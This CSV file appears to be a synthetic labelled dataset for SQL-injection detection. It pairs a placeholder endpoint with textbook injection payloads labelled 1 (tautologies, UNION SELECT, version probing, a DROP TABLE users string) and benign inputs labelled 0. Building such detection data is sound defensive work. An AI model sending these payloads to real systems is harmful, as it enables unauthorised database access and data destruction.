url,param,value,label
http://vuln.com/api,input,' OR 1=1/*366,1
http://vuln.com/api,input,' OR 1=1#476,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --246",1
http://vuln.com/api,input,hello123302,0
http://vuln.com/api,input,contact_us11,0
http://vuln.com/api,input,' OR 1=1#277,1
http://vuln.com/api,input,search_item169,0
http://vuln.com/api,input,' OR NOT 1=2 --23,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --124,1
http://vuln.com/api,input,product_list466,0
http://vuln.com/api,input,logout251,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--310,1
http://vuln.com/api,input,' OR NOT 1=2 --318,1
http://vuln.com/api,input,contact_us19,0
http://vuln.com/api,input,feedback_form111,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --28",1
http://vuln.com/api,input,feedback_form277,0
http://vuln.com/api,input,' OR 1=1 --238,1
http://vuln.com/api,input,invoice_2024423,0
http://vuln.com/api,input,' OR NOT 1=2 --322,1
http://vuln.com/api,input,' OR '' = ''93,1
http://vuln.com/api,input,' OR 1=1#88,1
http://vuln.com/api,input,john25,0
http://vuln.com/api,input,search_item287,0
http://vuln.com/api,input,' OR 1=1/*331,1
http://vuln.com/api,input,' OR 1=1 --307,1
http://vuln.com/api,input,admin227,0
http://vuln.com/api,input,export_data373,0
http://vuln.com/api,input,admin83,0
http://vuln.com/api,input,search_item284,0
http://vuln.com/api,input,export_data324,0
http://vuln.com/api,input,download_report438,0
http://vuln.com/api,input,update_profile182,0
http://vuln.com/api,input,' OR '' = ''37,1
http://vuln.com/api,input,email=admin@example.com164,0
http://vuln.com/api,input,letmein290,0
http://vuln.com/api,input,feedback_form167,0
http://vuln.com/api,input,' OR 1=1/*97,1
http://vuln.com/api,input,'; DROP TABLE users; --438,1
http://vuln.com/api,input,email=admin@example.com73,0
http://vuln.com/api,input,product_list79,0
http://vuln.com/api,input,contact_us53,0
http://vuln.com/api,input,john276,0
http://vuln.com/api,input,admin355,0
http://vuln.com/api,input,john56,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--225,1
